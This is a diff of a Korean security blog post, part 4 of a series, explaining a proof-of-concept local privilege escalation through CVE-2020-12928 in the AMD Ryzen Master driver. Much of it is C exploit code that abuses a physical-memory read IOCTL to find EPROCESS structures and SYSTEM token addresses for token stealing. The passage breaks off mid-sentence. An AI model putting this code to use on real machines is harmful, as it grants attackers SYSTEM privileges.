@@ -19,7 +19,8 @@
 &lt;p&gt;&amp;#xACF5;&amp;#xB300;&amp;#xC624;&amp;#xBE60;&amp;#xAC00; &amp;#xC54C;&amp;#xB824;&amp;#xC8FC;&amp;#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &amp;#xBD84;&amp;#xC11D;(3) &amp;#x2190; Now!&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;&amp;#xC5B4;&amp;#xB290;&amp;#xB367; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xD30C;&amp;#xD2B8;&amp;#xB124;&amp;#xC694;! &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; Part 3&amp;#xC5D0;&amp;#xC11C; &amp;#xC18C;&amp;#xAC1C;&amp;#xD588;&amp;#xB358; exploit &amp;#xC2DC;&amp;#xB098;&amp;#xB9AC;&amp;#xC624;&amp;#xB300;&amp;#xB85C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAD8C;&amp;#xD55C;&amp;#xC0C1;&amp;#xC2B9; &amp;#xACFC;&amp;#xC815;&amp;#xC744; PoC &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xC815;&amp;#xB9AC;&amp;#xD55C; &amp;#xAE00;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5BC;&amp;#xB978; cmd&amp;#xCC3D;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;&amp;#xC744; &amp;#xB744;&amp;#xC6CC;&amp;#xBCF4;&amp;#xC790;&amp;#xAD6C;&amp;#xC694;!&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;h1 id=&#34;Exploitation&#34;&gt;&lt;a href=&#34;#Exploitation&#34; class=&#34;headerlink&#34; title=&#34;Exploitation&#34;&gt;&lt;/a&gt;Exploitation&lt;/h1&gt;&lt;h2 id=&#34;Parse-EPROCESS&#34;&gt;&lt;a href=&#34;#Parse-EPROCESS&#34; class=&#34;headerlink&#34; title=&#34;Parse EPROCESS&#34;&gt;&lt;/a&gt;Parse EPROCESS&lt;/h2&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; arbitrary read &amp;#xD504;&amp;#xB9AC;&amp;#xBBF8;&amp;#xD2F0;&amp;#xBE0C;&amp;#xB85C; &amp;#xBB3C;&amp;#xB9AC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB418;&amp;#xB294; kernel pool&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC640; &amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xCC3E;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xB294; &lt;code&gt;POOL_HEADER&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC5D0;&amp;#xC11C; &amp;#xC77C;&amp;#xC815;&amp;#xD55C; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
@@ -31,22 +32,27 @@ PROCESS ffffbd010035b080
     SessionId: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;  Cid: &lt;span class=&#34;hljs-number&#34;&gt;0424&lt;/span&gt;    Peb: af3c91000  ParentCid: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;c78
     DirBase: &lt;span class=&#34;hljs-number&#34;&gt;18e84&lt;/span&gt;a000  ObjectTable: ffff9e8945b562c0  HandleCount:  &lt;span class=&#34;hljs-number&#34;&gt;68.&lt;/span&gt;
     Image: cmd.exe&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/1.png&#34; alt&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/1.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; EPROCESS &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xC8FC;&amp;#xC18C; &lt;code&gt;0xffffbd010035b080 - 0x80 + 0x4&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC774; &amp;#xC77C;&amp;#xC815;&amp;#xD55C;&amp;#xC9C0; &amp;#xB2E4;&amp;#xB978; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC778; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xB3C4; &amp;#xD55C;&amp;#xBC88; &amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;PROCESS ffffbd0ffd7480c0
     SessionId: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;  Cid: &lt;span class=&#34;hljs-number&#34;&gt;0294&lt;/span&gt;    Peb: &lt;span class=&#34;hljs-number&#34;&gt;81e2405000&lt;/span&gt;  ParentCid: &lt;span class=&#34;hljs-number&#34;&gt;01f&lt;/span&gt;4
     DirBase: &lt;span class=&#34;hljs-number&#34;&gt;233b&lt;/span&gt;99000  ObjectTable: ffff9e893b5ff480  HandleCount: &lt;span class=&#34;hljs-number&#34;&gt;1365.&lt;/span&gt;
     Image: lsass.exe&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/2.png&#34; alt&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/2.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; EPROCESS &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xC8FC;&amp;#xC18C; &lt;code&gt;0xffffbd0ffd7480c0 - 0x70 + 0x4&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC74C;.. &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xBCC4;&amp;#xB85C; &lt;code&gt;POOL_HEADER&lt;/code&gt;&amp;#xC640; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xC0AC;&amp;#xC774; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC5D0; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xC788;&amp;#xB124;&amp;#xC694;. &amp;#xADF8;&amp;#xB7EC;&amp;#xB098; &amp;#xB450; &amp;#xC0AC;&amp;#xC9C4; &amp;#xBAA8;&amp;#xB450; &amp;#xD30C;&amp;#xB780;&amp;#xC0C9; &amp;#xBC15;&amp;#xC2A4;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xD558;&amp;#xC704; 4 bytes &amp;#xAC12;&amp;#xC740; &amp;#xD56D;&amp;#xC0C1; &lt;code&gt;0x00000003&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xACE0;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xB97C; &amp;#xCC3E;&amp;#xACE0;, &amp;#xD0DC;&amp;#xADF8;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC57D; &lt;code&gt;0x100&lt;/code&gt; &amp;#xC624;&amp;#xD504;&amp;#xC14B; &amp;#xC0AC;&amp;#xC774;&amp;#xC758; &lt;code&gt;0x00000003&lt;/code&gt; &amp;#xAC12;&amp;#xC774; &amp;#xC788;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB97C; &amp;#xD2B9;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xB124;&amp;#xC694;! IOCTL &lt;code&gt;0x81112F08&lt;/code&gt; &amp;#xB85C; &amp;#xBAA8;&amp;#xB4E0; kernel pool&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC2DC;&amp;#xD0A4;&amp;#xAE38; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xB610;&amp;#xD55C; &amp;#xCC3E;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xACFC; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xD558;&amp;#xC704; 4 bytes &amp;#xAC12; &lt;code&gt;0x00000003&lt;/code&gt;&amp;#xC740; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xBE4C;&amp;#xB4DC; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xB2E4;&amp;#xB97C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC6B0;&amp;#xC120; &amp;#xC804;&amp;#xCCB4; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC11C;&amp;#xCE6D;&amp;#xD558;&amp;#xBA70; &lt;code&gt;Proc&lt;/code&gt; &amp;#xD0DC;&amp;#xADF8;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xAE30;&amp;#xB85D;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;PROC_DATA&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB97C; &amp;#xC120;&amp;#xC5B8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; {&lt;/span&gt;
     INT64 proc_address[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;];
@@ -54,7 +60,9 @@ PROCESS ffffbd010035b080
     INT64 header_size[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;];
     INT64 proc_count;
 } PROC_DATA;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC11C;&amp;#xCE6D;&amp;#xD560; &amp;#xBB3C;&amp;#xB9AC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; &amp;#xC9C0;&amp;#xC815;&amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xB370;, &amp;#xC774; &amp;#xBC94;&amp;#xC704;&amp;#xB294; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC758; &amp;#xC804;&amp;#xCCB4; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB098; (&amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC5D0;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;) &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xD06C;&amp;#xAE30; &amp;#xB4F1;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xC601;&amp;#xD5A5;&amp;#xC744; &amp;#xBC1B;&amp;#xC544; &amp;#xC11C;&amp;#xCE6D;&amp;#xD560; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xBC94;&amp;#xC704;&amp;#xAC00; &amp;#xD06C;&amp;#xAC8C; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xB098;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xD558;&amp;#xB294; &amp;#xD658;&amp;#xACBD;&amp;#xC5D0; &amp;#xB9DE;&amp;#xAC8C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC8FC;&amp;#xC5B4;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC81C; &amp;#xACBD;&amp;#xC6B0;&amp;#xB294; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8; PC 16GB, VM&amp;#xC5D0; 4GB&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD588;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;0x120000000&lt;/code&gt; ~ &lt;code&gt;0x240000000&lt;/code&gt; &amp;#xBC94;&amp;#xC704;&amp;#xB85C; &amp;#xC9C0;&amp;#xC815;&amp;#xC744; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; DEVICE_NAME         &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;\\\\\\\\.\\\\AMDRyzenMasterDriverV15&amp;quot;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; WRITE_IOCTL         (DWORD)0x81112F0C&lt;/span&gt;
@@ -111,22 +119,28 @@ PROCESS ffffbd010035b080
 }
 
 ...&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;0x120000000&lt;/code&gt; ~ &lt;code&gt;0x240000000&lt;/code&gt; &amp;#xC0AC;&amp;#xC774; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xCC3E;&amp;#xB294; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;INT64 read_address = START_ADDRESS + (i * &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
 &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (read_address &amp;gt;= END_OF_ADDRESS) {
 	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;END of Address\\n&amp;quot;&lt;/span&gt;);
 	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; proc_data;
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC77D;&amp;#xC744; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &lt;code&gt;0x120000000&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC2DC;&amp;#xC791;&amp;#xD574; Page &amp;#xD06C;&amp;#xAE30;&amp;#xC778; &lt;code&gt;0x1000&lt;/code&gt; &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xC99D;&amp;#xAC00;&amp;#xC2DC;&amp;#xD0A4;&amp;#xBA70; &amp;#xC11C;&amp;#xCE6D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;READ_INPUT_BUFFER input_buff = { read_address, len };
 LPVOID output_buff = VirtualAlloc(&lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x100c&lt;/span&gt;, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
 DeviceIoControl(dHandle, READ_IOCTL, &amp;amp;input_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;, output_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x100c&lt;/span&gt;, &amp;amp;dwRet, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
 INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;input_buff&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xBB3C;&amp;#xB9AC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xAE38;&amp;#xC774;(&lt;code&gt;0x1000&lt;/code&gt;)&amp;#xB97C; &amp;#xC8FC;&amp;#xACE0;, &lt;code&gt;output_buff&lt;/code&gt;&amp;#xC5D0; &amp;#xCDA9;&amp;#xBD84;&amp;#xD55C; &amp;#xACF5;&amp;#xAC04;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD574; &lt;code&gt;DeviceIoControl&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;0x81112F08&lt;/code&gt; IOCTL &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xBCF4;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;code&gt;0x81112F08&lt;/code&gt; &amp;#xC740; METHOD_BUFFERED &amp;#xB85C; input&amp;#xACFC; output &amp;#xBC84;&amp;#xD37C;&amp;#xB97C; &amp;#xACF5;&amp;#xC720;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; IOCTL &amp;#xACB0;&amp;#xACFC; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; Input&amp;#xAC12;&amp;#xC774; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;output_buff&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;0xc&lt;/code&gt; (&lt;code&gt;INT64 read_address(0x8) + DWORD len(0x4)&lt;/code&gt;) &amp;#xB9CC;&amp;#xD07C; &amp;#xB354;&amp;#xD55C; &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC774; IOCTL &amp;#xC694;&amp;#xCCAD;&amp;#xC758; &amp;#xACB0;&amp;#xACFC;&amp;#xAC12;&amp;#xC778; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB418;&amp;#xACE0; &lt;code&gt;result&lt;/code&gt;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC11;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (INT64 j = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; j &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0xF60&lt;/span&gt;; j += &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) { &lt;span class=&#34;hljs-comment&#34;&gt;// Searching Proc Tag&lt;/span&gt;
 	PINT64 proc_ptr = (PINT64)(result + &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt; + j);
 	INT32 proc_val = *(PINT32)proc_ptr
@@ -149,8 +163,10 @@ INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&
 		}            
 	}
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC6B0;&amp;#xC120; &lt;code&gt;result&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;0x10&lt;/code&gt; aligned &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xB3CC;&amp;#xBA70; &lt;code&gt;+0x4&lt;/code&gt; &amp;#xC704;&amp;#xCE58; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xAC12;&amp;#xC774; &lt;code&gt;0x635f7250&lt;/code&gt;(Proc)&amp;#xC778;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xB97C; &amp;#xCC3E;&amp;#xC558;&amp;#xC73C;&amp;#xBA74; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;PROC_HEADER&lt;/code&gt;&amp;#xC758; &amp;#xC608;&amp;#xC0C1; &amp;#xCD5C;&amp;#xB300; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; &amp;#xC57D; &lt;code&gt;0xA0&lt;/code&gt;&amp;#xAE4C;&amp;#xC9C0; &lt;code&gt;0x10&lt;/code&gt; &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xD55C; &amp;#xBC88; &amp;#xB354; &amp;#xB3CC;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;0x00000003&lt;/code&gt; &amp;#xAC12;&amp;#xC774; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xCC3E;&amp;#xACE0;, &amp;#xCC3E;&amp;#xC73C;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC;&amp;#xAE4C;&amp;#xC9C0; &amp;#xAD6C;&amp;#xD55C; Proc tag address &amp;#xC640; page entry offset, header size&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xB2E4;&amp;#xC2DC; &lt;code&gt;EPRCEOSS&lt;/code&gt;&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &lt;code&gt;PROC_DATA&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC758; &amp;#xAC01; &amp;#xBC30;&amp;#xC5F4;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xC758; &amp;#xAC01; &amp;#xD544;&amp;#xB4DC;&amp;#xAC12;(&lt;code&gt;ImageFileName&lt;/code&gt;, &lt;code&gt;Token&lt;/code&gt;, &lt;code&gt;UniqueProcessId&lt;/code&gt;)&amp;#xC744; &amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xAC12;&amp;#xC744; &amp;#xAD6C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;parse_proc&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PROC_DATA proc_data, HANDLE dHandle)&lt;/span&gt; &lt;/span&gt;{
     DWORD bytes_ret = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
@@ -183,8 +199,10 @@ INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&
         }
     }
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;proc_address &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C; + page entry offset + header size&lt;/code&gt; &amp;#xAC00; &lt;code&gt;EPROCESS&lt;/code&gt;&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xAC00; &amp;#xB418;&amp;#xBA70; &amp;#xC0AC;&amp;#xC804;&amp;#xC5D0; &amp;#xAD6C;&amp;#xD55C; &lt;code&gt;EPROCESS&lt;/code&gt;&amp;#xC758; &amp;#xAC01; &amp;#xD544;&amp;#xB4DC;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xB354;&amp;#xD574; &lt;code&gt;Token&lt;/code&gt;&amp;#xACFC; &lt;code&gt;ImageFileName&lt;/code&gt;&amp;#xC744; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;ImageFileName&lt;/code&gt;&amp;#xC774; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &lt;code&gt;EPROCESS&lt;/code&gt;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xD544;&amp;#xB4DC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0;, 